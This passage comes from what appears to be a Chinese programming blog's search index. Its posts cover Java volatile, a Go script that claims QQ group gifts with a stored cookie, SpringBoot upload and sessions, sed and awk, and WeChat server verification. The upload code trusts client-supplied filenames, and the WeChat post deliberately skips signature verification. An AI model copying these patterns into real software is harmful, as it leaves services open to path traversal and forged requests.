; @Override public void run() &#123; for (int i=0;i&lt;10000 ;i++)&#123; count ++ ; //count.incrementAndGet() ; &#125; &#125; public static void main(String[] args) throws InterruptedException &#123; VolatileInc volatileInc = new VolatileInc() ; Thread t1 = new Thread(volatileInc,"t1") ; Thread t2 = new Thread(volatileInc,"t2") ; t1.start(); //t1.join(); t2.start(); //t2.join(); for (int i=0;i&lt;10000 ;i++)&#123; count ++ ; //count.incrementAndGet(); &#125; System.out.println("最终Count="+count); &#125;&#125; 当我们三个线程(t1,t2,main)同时对一个 int 进行累加时会发现最终的值都会小于 30000。 这是因为虽然 volatile 保证了内存可见性，每个线程拿到的值都是最新值，但 count ++ 这个操作并不是原子的，这里面涉及到获取值、自增、赋值的操作并不能同时完成。所以想到达到线程安全可以使这三个线程串行执行(其实就是单线程，没有发挥多线程的优势)。 也可以使用 synchronize 或者是锁的方式来保证原子性。 还可以用 Atomic 包中 AtomicInteger 来替换 int，它利用了 CAS 算法来保证了原子性。 6.2 指令重排内存可见性只是 volatile 的其中一个语义，它还可以防止 JVM 进行指令重排优化。 举一个伪代码: 123int a=10 ;//1int b=20 ;//2int c= a+b ;//3 一段特别简单的代码，理想情况下它的执行顺序是：1&gt;2&gt;3。但有可能经过 JVM 优化之后的执行顺序变为了 2&gt;1&gt;3。 如果下一段的语句没有使用上一段语句的结果，JVM就认为两句语句是没有关联的就可能进行重排，JVM不会保证代码的执行顺序，但会保证最终的结果都是一样的 可以发现不管 JVM 怎么优化，前提都是保证单线程中最终结果不变的情况下进行的。 可能这里还看不出有什么问题，那看下一段伪代码: 12345678910111213141516171819private static Map&lt;String,String&gt; value ;private static volatile boolean flag = fasle ;//以下方法发生在线程 A 中 初始化 Mappublic void initMap()&#123; //耗时操作 value = getMapValue() ;//1 flag = true ;//2&#125;//发生在线程 B中 等到 Map 初始化成功进行其他操作public void doSomeThing()&#123; while(!flag)&#123; sleep() ; &#125; //dosomething doSomeThing(value);&#125; 这里就能看出问题了，当 flag 没有被 volatile 修饰时，JVM 对 1 和 2 进行重排，导致 value 都还没有被初始化就有可能被线程 B 使用了。 所以加上 volatile 之后可以防止这样的重排优化，保证业务的正确性。 指令重排的的应用 一个经典的使用场景就是双重懒加载的单例模式了: 12345678910111213141516171819public class Singleton &#123; private static volatile Singleton singleton; private Singleton() &#123; &#125; public static Singleton getInstance() &#123; if (singleton == null) &#123; synchronized (Singleton.class) &#123; if (singleton == null) &#123; //防止指令重排 singleton = new Singleton(); &#125; &#125; &#125; return singleton; &#125;&#125; 这里的 volatile 关键字主要是为了防止指令重排。 如果不用 ，singleton = new Singleton();，这段代码其实是分为三步： 分配内存空间。(1) 初始化对象。(2) 将 singleton 对象指向分配的内存地址。(3) 加上 volatile 是为了让以上的三步操作顺序执行，反之有可能第二步在第三步之前被执行就有可能某个线程拿到的单例对象是还没有初始化的，以致于报错。 总结volatile 在 Java 并发中用的很多，比如像Atomic包中的 value、以及 AbstractQueuedLongSynchronizer中的 state都是被定义为 volatile 来用于保证内存可见性。 将这块理解透彻对我们编写并发程序时可以提供很大帮助。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JVM</tag>
        <tag>类加载</tag>
        <tag>垃圾回收</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[QQ每天定时领取群礼物]]></title>
    <url>%2F2019%2F08%2F21%2FQQ%E6%AF%8F%E5%A4%A9%E5%AE%9A%E6%97%B6%E9%A2%86%E5%8F%96%E7%BE%A4%E7%A4%BC%E7%89%A9%2F</url>
    <content type="text"><![CDATA[本脚本采用Go语言进行编写，主要原因是简单粗暴，几行代码就搞定了，后面部署也非常方便 目录结构 1. 代码编写1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package mainimport ( "encoding/json" "fmt" "github.com/robfig/cron" "io/ioutil" "net/http" "strings" "time")type Gift struct &#123; Name string `json:"name"`&#125;func main() &#123; c := cron.New() // 每天凌晨5点执行一次 spec := "0 0 5 * * ?" c.AddFunc(spec, func() &#123; client := &amp;http.Client&#123;&#125; req, err := http.NewRequest("POST", "https://pay.qun.qq.com/cgi-bin/group_pay/good_feeds/draw_lucky_gift", strings.NewReader("bkn=183506344&amp;from=0&amp;gc=40636692&amp;client=1&amp;version=7.7.0.3645")) if err != nil &#123; fmt.Println("构建request失败") &#125; req.Header.Set("Content-Type", "application/json;charset=utf-8") req.Header.Set("Cookie", getCookie()) resp, err := client.Do(req) body, err := ioutil.ReadAll(resp.Body) if err != nil &#123; fmt.Println("请求内容失败") &#125; defer resp.Body.Close() var gift = Gift&#123;&#125; err = json.Unmarshal(body, &amp;gift) if err!=nil &#123; fmt.Println("JSON解析失败",err.Error()) &#125; now := time.Now() date := now.Format("2006-01-02") fmt.Printf(date+" 获得礼物:"+gift.Name) &#125;) c.Start() select&#123;&#125;&#125;func getCookie() string &#123; bytes, err := ioutil.ReadFile("cookie") if err != nil &#123; fmt.Println("读取Cookie失败:",err.Error()) &#125; return string(bytes)&#125; 2. 编译为了能跑在Linux上，所以这里要把它编译为在Linux上可执行文件。 新建脚本 build.bat，输入下面内容 1234SET CGO_ENABLED=0SET GOOS=linuxSET GOARCH=amd64go build auto_get_gift.go 执行编译 3. 部署 把生成的auto_get_gift和cookie上传到Linux服务器上 添加可执行权限 1chmod +x auto_get_gift 启动 1nohup ./auto_get_gift &gt; gift.log &amp; 查看是否在运行 1jobs -l]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>qq群礼物</tag>
        <tag>post请求</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot上传下载文件]]></title>
    <url>%2F2019%2F08%2F17%2FSpringBoot%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[1 配置文件1234567########## 文件上传配置 ######### spring: servlet: multipart: enabled: true # 开启多文件上传 max-file-size: 5MB max-request-size: 5MB 2 Controller编写123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112package com.pibigstar.web;import java.io.BufferedInputStream;import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.OutputStream;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import javax.servlet.ServletOutputStream;import javax.servlet.http.HttpServletResponse;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.multipart.MultipartFile;import org.springframework.web.servlet.mvc.support.RedirectAttributes;import com.pibigstar.common.Constant;/** * 文件上传Controller * @author pibigstar * */@Controller()@RequestMapping("/file")public class FileController &#123; private final String upload_path = Constant.DEFAULT_FILE_UPLOAD_PATH; @GetMapping("toUpload") public String index() &#123; return "upload"; &#125; /** * 上传 * @param file * @param redirectAttributes * @return */ @PostMapping("upload") public String singleFileUpload(@RequestParam("file") MultipartFile file,RedirectAttributes redirectAttributes) &#123; if (file.isEmpty()) &#123; redirectAttributes.addFlashAttribute("message", "请选择文件进行上传"); return "redirect:/file/uploadStatus"; &#125; try &#123; byte[] bytes = file.getBytes(); Path path = Paths.get(upload_path+file.getOriginalFilename()); Files.write(path, bytes); redirectAttributes.addFlashAttribute("message","成功上传文件： '" + file.getOriginalFilename() + "'"); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return "redirect:/file/uploadStatus"; &#125; /** * 下载 * @param res * @throws IOException */ @GetMapping("download") public void download(HttpServletResponse res) throws IOException &#123; String fileName = "Main.jpg"; res.setHeader("content-type", "application/octet-stream"); res.setContentType("application/octet-stream"); res.setHeader("Content-Disposition", "attachment;filename=" + fileName); byte[] buff = new byte[1024]; BufferedInputStream bis = null; OutputStream os = null; try &#123; os = res.getOutputStream(); bis = new BufferedInputStream(new FileInputStream(new File("E://temp/"+ fileName))); int i = bis.read(buff); while (i != -1) &#123; os.write(buff, 0, buff.length); os.flush(); i = bis.read(buff); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; finally &#123; if (bis != null) &#123; try &#123; bis.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125; System.out.println("success"); &#125; @GetMapping("uploadStatus") public String uploadStatus() &#123; return "uploadStatus"; &#125;&#125; 3 前台upload.html 12345678910111213&lt;!DOCTYPE html&gt;&lt;html xmlns:th="http://www.thymeleaf.org"&gt;&lt;body&gt;&lt;h1&gt;文件上传示例&lt;/h1&gt;&lt;form method="POST" action="/file/upload" enctype="multipart/form-data"&gt; &lt;input type="file" name="file" /&gt;&lt;br/&gt;&lt;br/&gt; &lt;input type="submit" value="Submit" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; uploadStatus.html 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang="en" xmlns:th="http://www.thymeleaf.org"&gt;&lt;body&gt;&lt;h1&gt;上传成功&lt;/h1&gt;&lt;div th:if="$&#123;message&#125;"&gt; &lt;h2 th:text="$&#123;message&#125;"/&gt;&lt;/div&gt;&lt;div th:if="$&#123;path&#125;"&gt; &lt;h2 th:text="$&#123;path&#125;"/&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>springboot,SpringBoot技能大全</category>
      </categories>
      <tags>
        <tag>springboot</tag>
        <tag>上传文件</tag>
        <tag>下载文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot读取配置文件并注入到静态变量中]]></title>
    <url>%2F2019%2F08%2F17%2FSpringBoot%E8%AF%BB%E5%8F%96%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%B9%B6%E6%B3%A8%E5%85%A5%E5%88%B0%E9%9D%99%E6%80%81%E5%8F%98%E9%87%8F%E4%B8%AD%2F</url>
    <content type="text"><![CDATA[1 读取配置文件到常量中大家熟知的方式是将配置文件注入到一个bean中去访问，但是这种方式每次使用这个bean都要写一个注入@Autowired去引用这个bean不是很方便，如果将配置文件注入到一个配置常量用，那么每次访问用Constant.NAME就可以了，这样是不是方便了很多 12345678910111213141516171819202122package com.pibigstar.common;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.beans.factory.annotation.Value;import org.springframework.context.annotation.Configuration;/** * 常量 * @author pibigstar * */@Configurationpublic class Constant &#123; //此数据是读取的配置文件 public static String DEFAULT_FILE_UPLOAD_PATH; //注入 @Autowired(required = false) public void setUploadPath(@Value("$&#123;parsevip.file.path&#125;")String DEFAULT_FILE_UPLOAD_PATH) &#123; Constant.DEFAULT_FILE_UPLOAD_PATH = DEFAULT_FILE_UPLOAD_PATH; &#125; &#125; 配置文件application.yml中： 123parsevip: file: path: D://upload/ 使用 12//任意处String filePath = Constant.DEFAULT_FILE_UPLOAD_PATH; 2 读取自定义的配置文件那我们可不可以读取自定义的配置文件呢，答案是肯定的，看代码 123456789101112131415161718192021222324252627package com.pibigstar.common.config;import org.springframework.boot.context.properties.ConfigurationProperties;import org.springframework.context.annotation.Configuration;import org.springframework.context.annotation.PropertySource;/** * 读取配置文件的自定义常量 * @author pibigstar * */@Configuration@PropertySource("classpath:myconfig.properties")@ConfigurationProperties(prefix="parsevip")public class MyConfiguration &#123; private String filePath; public String getFilePath() &#123; return filePath; &#125; public void setFilePath(String filePath) &#123; this.filePath = filePath; &#125; &#125; 使用： 12@Autowiredprivate MyConfiguration myConfig; myconfig.properties （将此文件放到src/main/resources目录下） 1parsevip.filePath=D://temp 有一点要注意：用此方法必须为*.properties 文件，不能是yml文件，不知道yml文件应该怎么读取，有知道的麻烦留言告诉我一声，不胜感激。。。。 yml文件操作用两个类去实现，一个类实现配置自动注入，另一个使用常量引用它 12345678@Component("DefaultProperties")@ConfigurationProperties(prefix = MessageProperties.MESSAGE_PREFIX)public class DefaultProperties &#123; public static final String MESSAGE_PREFIX = "app.default"; private String name; private String version; // setter,getter方法&#125; 引用它 12345public class Constants &#123; private static final DefaultProperties properties = BeanFactory.getBean("DefaultProperties"); public static final String NAME = properties.getName(); public static final String VERSION = properties.getVersion();&#125; yml文件 1234app: default: name: test version: 1.0 使用 1Constants.NAME]]></content>
      <categories>
        <category>springboot,SpringBoot技能大全</category>
      </categories>
      <tags>
        <tag>springboot</tag>
        <tag>读取配置文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NodeJs安装使用教程]]></title>
    <url>%2F2019%2F08%2F17%2FNodeJs%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[安装nvm它是用来管理本机多个nodejs的，使用它可以很方便的下载其他版本的nodejs，并在这些版本之间来回切换下载地址：https://github.com/coreybutler/nvm-windows/releases 使用 安装最新版本的nodejs 1nvm insatll latest 切换到指定版本 1nvm use 12.6.0 查看当前有哪些node 1nvm list 安装最新版本 1nvm install stable 1.下载官网下载 ：https://nodejs.org/en/download/ 下载好之后，一路next即可 2. 更改配置2.1 更改目录2.1.1 更改缓存目录1npm config set cache "D:\nodejs\node_cache" 2.1.2 更改全局安装目录以后安装的模块都会安装到此目录下 1npm config set prefix "D:\nodejs\node_global" 2.2 更改镜像设置为国内的镜像，以便于更快的下载模块 1npm config set registry=http://registry.npm.taobao.org 2.3 查看当前配置1npm config list 3. 安装一些常用模块3.1 安装最新的npm加-g参数是全局安装，也就是将模块安装到D:\nodejs\node_global目录下 1npm install npm -g 3.2 安装vue1npm install vue -g 3.3 安装es-lint这是一个代码规范检查工具 1npm install eslint -g 4. 查看当前已安装模块1npm list -global]]></content>
      <categories>
        <category>nodejs</category>
      </categories>
      <tags>
        <tag>nodejs</tag>
        <tag>vue</tag>
        <tag>nvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sed和awk常用操作]]></title>
    <url>%2F2019%2F08%2F11%2Fsed%E5%92%8Cawk%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[@[toc] 1. sed命令说明 sed是流式文本处理，它是对文本进行一行一行的处理，处理完一行之后，再读取下一行，sed默认不会修改源文件的 命令格式： 1sed 参数 '动作' 文本文件 参数有： -n 仅显示sed处理后的结果。 -i 将修改保存到源文件中 -e &lt;script&gt; 以选项中指定的script来处理输入的文本文件。 -f&lt;script文件&gt; 以选项中指定的script文件来处理输入的文本文件。 动作有： 动静基本和 vim 中一样，a 是新增，i 是插入，d 是删除，s 是替换 a:新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～ i:插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)； s:替换，替换字符串，需要使用分隔符把新旧文本分开，分隔符可以为：/ , # d:删除，因为是删除啊，所以 d 后面通常不接任何咚咚； c:取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！ p:打印，亦即将某个选择的数据印出。通常 p 会与参数sed -n一起运行 q:退出, 退出sed处理，一般用来找到第一个匹配项就退出处理了 eg 1234567891011121314151617181920212223242526# 打印第10行，p 一般和 -n配合使用sed -n '10p' test.txt# 打印1到10行sed -n '1,10p' test.txt# 每隔2行查看，查看1,3,5....行sed -n '1~2p' test.txt# 新增,在第1行后新增 ========sed '1a ========' test.txt# 插入，在1行前面插入 =======sed '1i =======' test.txt# 删除, 删除最后一行,$表示最后一行sed '$d' test.txt# 退出,找到pibigstar就退出sed '/pibigstar/q' test.txt# 替换，一行只会替换第一个匹配的，后面的不会被替换sed 's/dev/prod/' test.txt# 全局替换，添加 -g，那么一行中如果符合将全部替换sed 's/dev/prod/g' test.txt 一般先不用-i参数，当我们执行 sed之后会显示执行后的结果，如果结果是符合我们预期的，那么再加上 -i 参数来达到修改源文件的目的 1.2 Sed高级操作 {}:多个动作，{}中可放多个sed动作，用 ;分开 &amp;:替换固定字符串，主要是优化替换操作，&amp; 代表前面替换的字符 \u\U:大小写转换，\u将其转换为小写，\U将其转换为大写 ():取括号中的值，替换时可根据\1来标识取那个()中的值，\2取第二个括号中的值,注意使用时都是需要用\( \)，其实主要也是为了优化替换操作12345678# 多个动作,先删除第一行,然后将后面的 dev 替换为 prodsed '&#123;1d;s/dev/prod/g&#125;' test.txt# &amp; 操作,将 = 后面添加一个空格sed 's/=/&amp; /' test.txt# \u操作,将ROOT转换为rootsed 's/ROOT/\u&amp;/' test.txt# ()操作，取出usernamesed 's/\([a-z_-]\+\):.*$/\1/' passwd 1.3 Sed常用命令12345# 配置文件尾添加配置sed '$a port=8080 \nhost=127.0.0.1' test.txt# 删除文本空行sed '^$d' test.txt 2. awk命令说明awk的命令格式 1awk -F '分隔符' '命令' file 内置函数$0: 代表所有域$1: 代码第一个域，下面依次类推 $2,就是第二个域NR: 行号NF: 字符数print: 打印printf: 格式化打印 2.1 切换分割符 -F 是可选参数，可以不写，不写的话，默认分隔符为空格 以冒号:作为分隔符 1awk -F ':' '&#123;print $1&#125;' /etc/passwd {} 中可直接可以放代码块，if…else… 1awk -F ':' '&#123;printf("user:%s Line:%s Col:%s \n",$1,NR,NF)&#125;' /etc/passwd 2.2 条件输出初次之外我们还可以有条件的将其输出 12# 当$3 大于 100 才输出awk -F ':' '$3&gt;100&#123;print $1&#125;' /etc/passwd 2.3 BEGIN…END循环统计文件夹下所有文件一共多大 1ls -l | awk 'BEGIN&#123;size=0&#125;&#123;size+=$5&#125;END&#123;print "all size:"size/1024/1024"M"&#125;' 我们将一行文本按分隔符分隔之后，第一个就是 第一个域，下面依次类推举个栗子： 12345root pts/1 192.168.1.100 Tue Feb 10 11:21 still logged inroot pts/1 192.168.1.100 Tue Feb 10 00:46 - 02:28 (01:41)root pts/1 192.168.1.100 Mon Feb 9 11:41 - 18:30 (06:48)dmtsai pts/1 192.168.1.100 Mon Feb 9 11:41 - 11:41 (00:00)root tty1 Fri Sep 5 14:09 - 14:10 (00:01) 将上面的信息保存为test.txt文件，我们执行下面命令 1awk '&#123;print $1&#125;' test.txt 我们没有指定分隔符，那么就是以 空格 进行分隔的，那么输出结果就会是 12345rootrootrootdmtsairoot awk 是逐行进行分析，我们分析第一行就可以了 1root pts/1 192.168.1.100 Tue Feb 10 11:21 still logged in 按分隔符进行分隔，那么 12域1 域2 域3 域4 域5root pts/1 192.168.1.100 Tue Feb 10 11:21 still logged in 2.4 实例查问某文件中的关键字 1awk '/root/' /etc/passwd 其中 / / 之间可以使用正则表达式 1awk '/^root/' /etc/passwd 查看本地所有运行的端口 1netstat -na | grep LISTENING | awk '&#123;print $2&#125;' | awk -F: '&#123;print $2&#125;']]></content>
      <categories>
        <category>Linux,shell</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>shell</tag>
        <tag>awk</tag>
        <tag>sed</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[go语言实现服务器与微信公众平台对接]]></title>
    <url>%2F2019%2F08%2F11%2Fgo%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8E%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%B9%B3%E5%8F%B0%E5%AF%B9%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[微信对接文档：点击查看 在这不得不吐槽一下，写的什么玩意文档，给的例子真他么垃圾，文档说是返回echostr，例子给返回个true，false要不要这么误导人。 12345678910111213141516171819202122232425262728type GetSignature struct &#123; Signature string `json:"signature"` //微信加密签名，signature结合了开发者填写的token参数和请求中的timestamp参数、nonce参数。 Timestamp string `json:"timestamp"` //时间戳 Nonce string `json:"nonce"` //随机数 Echostr string `json:"echostr"` //随机字符串&#125;func signature(r *ghttp.Request) &#123; getSignature := new(GetSignature) r.GetToStruct(getSignature) sign := getSignature.Signature nonce := getSignature.Nonce timestamp := getSignature.Timestamp echostr := getSignature.Echostr strs := []string&#123;token, timestamp, nonce&#125; sort.Strings(strs) tempStr := fmt.Sprintf("%s%s%s", strs[0], strs[1], strs[2]) h := sha1.New() io.WriteString(h, tempStr) result := fmt.Sprintf("%x", h.Sum(nil)) if result != sign &#123; // 等不等于都让它返回正确的结果，zz验证 r.Response.Write(echostr) return &#125; r.Response.Write(echostr)&#125; 完全搞不懂微信他们到底要搞什么骚操作，这是什么垃圾验证，中间做了一大堆算法，其实一点屁用都没有，直接用下面这个粗暴的版本也可以： 1234567func signature(r *ghttp.Request) &#123; getSignature := new(GetSignature) r.GetToStruct(getSignature) echostr := getSignature.Echostr // 直接返回就可以了 r.Response.Write(echostr)&#125;]]></content>
      <categories>
        <category>go,微信小程序</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>微信公众平台</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GoLand文件格式化配置]]></title>
    <url>%2F2019%2F08%2F11%2FGoLand%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%8C%96%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[@[toc] 1. Go fmt配置Arguments: -w $FilePath$ 2. golangci-lint静态代码检查2.1 安装1go get -u github.com/golangci/golangci-lint/cmd/golangci-lint 2.2 配置 3. Proto格式化3.1 下载clang-format在这个网址进行下载：http://releases.llvm.org/download.html 文件有点大，一百多M，下载之后安装即可 3.2 配置clang-format Arguments上面输入： 123-style=&quot;&#123;BasedOnStyle: Google, IndentWidth: 4, ColumnLimit: 0, AlignConsecutiveAssignments: true, AlignConsecutiveAssignments: true&#125;&quot;-i$FilePath$ 注意：如果你是Windows，clang-format要选择clang-format.exe]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>proto</tag>
        <tag>goformat</tag>
        <tag>gofmt</tag>
        <tag>clang-format</tag>
        <tag>golang-ci</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot使用redis做分布式Session]]></title>
    <url>%2F2019%2F08%2F05%2FSpringBoot%E4%BD%BF%E7%94%A8redis%E5%81%9A%E5%88%86%E5%B8%83%E5%BC%8FSession%2F</url>
    <content type="text"><![CDATA[1. 核心原理主要是通过redis，当用户登录后生成一个随机的uuid作为token，将token作为键，user对象作为值存储到redis数据库中，同时将token保存到cookie中 ，当访问其他页面时判断cookie中是否有token，如果有，则根据此token从redis拿到用户信息即可。 关于springboot 操作redis方面请查看 : https://blog.csdn.net/junmoxi/article/details/80694405 2. User服务类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687package com.pibigstar.springboot.service.impl;import java.util.UUID;import javax.servlet.http.Cookie;import javax.servlet.http.HttpServletResponse;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.cache.annotation.Cacheable;import org.springframework.stereotype.Service;import org.springframework.transaction.annotation.Propagation;import org.springframework.transaction.annotation.Transactional;import com.pibigstar.springboot.dao.JPADao;import com.pibigstar.springboot.domain.User;import com.pibigstar.springboot.service.RedisService;import com.pibigstar.springboot.service.UserService;@Servicepublic class UserServiceImpl implements UserService&#123; public static final String COOKIE_USER_TOKEN = "token"; public static final int COOKIE_TOKEN_TIMEOUT = 3600*24*2;//两天 @Autowired private RedisService redisService; /** * 登录 * @param response * @param loginVo * @return */ @Override public boolean login(HttpServletResponse response, LoginVo loginVo) &#123; if(loginVo == null) &#123; throw new GlobalException(CodeMsg.SERVER_ERROR); &#125; String mobile = loginVo.getMobile(); String formPass = loginVo.getPassword(); //判断手机号是否存在 User user = getById(Long.parseLong(mobile)); if(user == null) &#123; throw new GlobalException(CodeMsg.MOBILE_NOT_EXIST); &#125; //验证密码 String dbPass = user.getPassword(); String saltDB = user.getSalt(); String calcPass = MD5Util.formPassToDBPass(formPass, saltDB); if(!calcPass.equals(dbPass)) &#123; throw new GlobalException(CodeMsg.PASSWORD_ERROR); &#125; //生成cookie String token = UUID.randomUUID().toString().replace("-", ""); addCookie(response, token, user); return true; &#125; /** * 根据token从redis中拿到user对象 */ @Override public User getByToken(HttpServletResponse response, String token) &#123; if (token==null) &#123; return null; &#125; User user = (User) redisService.getObject(token); if (user!=null) &#123; //延长cookie有效期 addCookie(response,token,user); &#125; return user; &#125; /** * 将token放到cookie中 * @param response * @param token * @param user */ private void addCookie(HttpServletResponse response, String token, User user) &#123; redisService.setObject(token, user,COOKIE_TOKEN_TIMEOUT); Cookie cookie = new Cookie(COOKIE_USER_TOKEN, token); //设置cookie有效期 cookie.setMaxAge(COOKIE_TOKEN_TIMEOUT); cookie.setPath("/"); response.addCookie(cookie); &#125;&#125; 3. 读取cookie中的token我们通过实现 HandlerMethodArgumentResolver 接口，重写里面的方法，将cookie中或者parameter中的token数据拿到然后查询出user注入到Controller中 的方法参数中 注册一个ArgumentResolvers 12345678910111213141516package com.pibigstar.springboot.config;import java.util.List;import org.springframework.context.annotation.Configuration;import org.springframework.web.method.support.HandlerMethodArgumentResolver;import org.springframework.web.servlet.config.annotation.InterceptorRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;@Configurationpublic class WebConfig implements WebMvcConfigurer&#123; @Override public void addArgumentResolvers(List&lt;HandlerMethodArgumentResolver&gt; resolvers) &#123; resolvers.add(new UserArgumentResolver()); WebMvcConfigurer.super.addArgumentResolvers(resolvers); &#125; 具体实现类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465package com.pibigstar.springboot.config;import javax.servlet.http.Cookie;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.core.MethodParameter;import org.springframework.stereotype.Component;import org.springframework.web.bind.support.WebDataBinderFactory;import org.springframework.web.context.request.NativeWebRequest;import org.springframework.web.method.support.HandlerMethodArgumentResolver;import org.springframework.web.method.support.ModelAndViewContainer;import org.thymeleaf.util.StringUtils;import com.pibigstar.springboot.domain.User;import com.pibigstar.springboot.service.UserService;import com.pibigstar.springboot.service.impl.UserServiceImpl;/** * 拿到session或parameter中的token * 通过token拿到redis中的user * 将user注入到方法的参数中 * @author pibigstar * */@Componentpublic class UserArgumentResolver implements HandlerMethodArgumentResolver&#123; @Autowired private UserService userService; @Override public boolean supportsParameter(MethodParameter parameter) &#123; Class&lt;?&gt; parameterType = parameter.getParameterType(); return parameterType==User.class; &#125; @Override public Object resolveArgument(MethodParameter parameter, ModelAndViewContainer mavContainer, NativeWebRequest webRequest, WebDataBinderFactory binderFactory) throws Exception &#123; HttpServletRequest request = webRequest.getNativeRequest(HttpServletRequest.class); HttpServletResponse response = webRequest.getNativeResponse(HttpServletResponse.class); String cookieToken = getCookieToken(request,UserServiceImpl.COOKIE_USER_TOKEN); String parameterToken = request.getParameter(UserServiceImpl.COOKIE_USER_TOKEN); if (StringUtils.isEmpty(parameterToken) &amp;&amp; StringUtils.isEmpty(cookieToken)) &#123; return null; &#125; String token = StringUtils.isEmpty(parameterToken)?cookieToken:parameterToken; return userService.getByToken(response,token); &#125; private String getCookieToken(HttpServletRequest request,String cookieName) &#123; Cookie[] cookies = request.getCookies(); for (Cookie cookie : cookies) &#123; if (cookie.getName().equals(cookieName)) &#123; return cookie.getValue(); &#125; &#125; return null; &#125;&#125; 4. 使用1234567891011121314151617181920212223package com.pibigstar.springboot.web;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import com.pibigstar.springboot.domain.User;@Controllerpublic class UserController &#123; /** * 这里的user 是通过token从redis拿到的 * 具体实现在UserArgumentResolver中 */ public String index(User user,Model model) &#123; if(user==null) &#123; return "login"; &#125;else &#123; model.addAttribute("user",user); return "index"; &#125; &#125;&#125;]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>springboot</tag>
        <tag>分布式session</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[获取微信公众号信息接口]]></title>
    <url>%2F2019%2F08%2F05%2F%E8%8E%B7%E5%8F%96%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E4%BF%A1%E6%81%AF%E6%8E%A5%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[西瓜插件里面的一个小接口： 1https://chromepluginapi.xiguaji.com/InspireCenter/SearchSubscribePopNew?kw=java派大星 kw为公众号名称]]></content>
      <categories>
        <category>随笔小记</category>
      </categories>
      <tags>
        <tag>微信公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows下编译Proto文件]]></title>
    <url>%2F2019%2F07%2F31%2FWindows%E4%B8%8B%E7%BC%96%E8%AF%91Proto%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[此处借助的为Windows的Linux子系统进行编译的 1. 安装Windows子系统（WSL） 设置开启开发者模式 程序中开启WSL子系统 应用商店下载Ubuntu 注意1 装好之后要修改一次密码，不然无法使用root 1sudo passwd 2 更新系统 1sudo apt-get update 3 安装make 1sudo apt-get install make 4 安装dos2unix 1sudo apt-get install dos2unix 2.配置编译环境 安装go百度 Ubuntu安装go 配置go环境编辑 /etc/profile 文件 1vim /etc/profile 将下面内容加入到末尾（GOPAT是我Windows中的GOPATH） 1234export GOROOT=/usr/local/goexport GOPATH=/mnt/f/goWorkexport PATH=$GOPATH/bin:$PATHexport PATH=$PATH:$GOROOT/bin:$GOPATH/bin 执行下面命令使配置生效 1source /etc/profile 如果出现每次关闭Terminal，配置就会失效，那么将配置放到 /etc/bash.bashrc 文件中 安装protoc去这个网址下载：https://github.com/protocolbuffers/protobuf/releases解压：1unzip protoc.zip 将bin文件夹下的 protoc 复制到Linux 中的 /bin目录下 1sudo cp protoc/bin/protoc /bin/protoc 执行 protoc -verson 如果输出版本信息则证明配置成功 安装protoc-gen-go 1go get -u github.com/golang/protobuf/protoc-gen-go protoc-gen-validate 